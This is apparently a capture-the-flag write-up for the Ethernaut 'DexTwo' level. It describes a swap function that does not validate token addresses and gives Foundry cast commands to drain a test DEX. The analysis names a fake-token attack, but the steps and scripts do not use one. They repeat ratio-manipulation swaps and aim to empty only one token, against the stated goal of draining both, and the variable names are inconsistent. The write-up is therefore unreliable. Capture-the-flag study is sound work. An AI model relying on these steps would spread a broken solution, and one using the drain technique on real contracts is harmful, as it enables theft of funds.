---
layout: writeup
title: "DexTwo"
level: "Intermediate"
category: "Ethernaut"
description: "One will succeed in this level if they manage to drain each of  the two tokens out of the contract, and allow the contract to report a `bad` price of the assets."
---

## Analysis
The vulnerability in Dex Two is that the swap function no longer checks if the from and to token addresses are the official token1 or token2.

**The Flaw:**
In the original Dex, there was a requirement that the tokens being swapped must be the ones the contract was designed for. In Dex Two, that check is missing. This means you can create a fake malicious token, mint a large amount to yourself, and "swap" your worthless fake tokens for the contract's real token1 and token2.

## Solution
To solve this, you need to perform a series of swaps. Since the price calculation is flawed, each swap increases your relative purchasing power.

**Step-by-Step:**

1.**Swap 10 Token1 for Token2** Your balance becomes (0, 20).
2.**Swap 20 Token2 for Token1** The ratio has changed, and you get more than 10 Token1 back.
3.**Repeat** Continue swapping your entire balance of the token you just received.
4.**Final Swap** On the last step, calculate exactly how much you need to swap to take the remaining balance of the contract.


## Foundry Scripts

<pre class="plain-code"><code>
# 1.**Approve Dex**
cast send $TOKEN1 "approve(address,uint256)" $DEX 1000 --rpc-url $RPC --private-key $PK
cast send $TOKEN2 "approve(address,uint256)" $DEX 1000 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY

# 2. **Swap 1(Token1 -> Token2)**
cast send $DEX "swap(address,address,uint256)" $TOKEN1 $TOKEN2 <AMOUNT> --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY

# 3.**Swap 2(Token2 -> Token1)**
cast send $DEX "swap(address,address,uint256)" $TOKEN2 $TOKEN1 <AMOUNT> --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY
// Perform sequence of swaps in order to drain atleast oneof the two Tokens

#4.**Verify the Balance**
cast call $DEX "balanceOf(address,address)" $TOKEN1 $DEX --rpc-url $SEPOLIA_RPC_URL  
cast call $DEX "balanceOf(address,address)" $TOKEN2 $DEX --rpc-url $SEPOLIA_RPC_URL
//Atleast one token balance need to be 0x00

</code></pre>
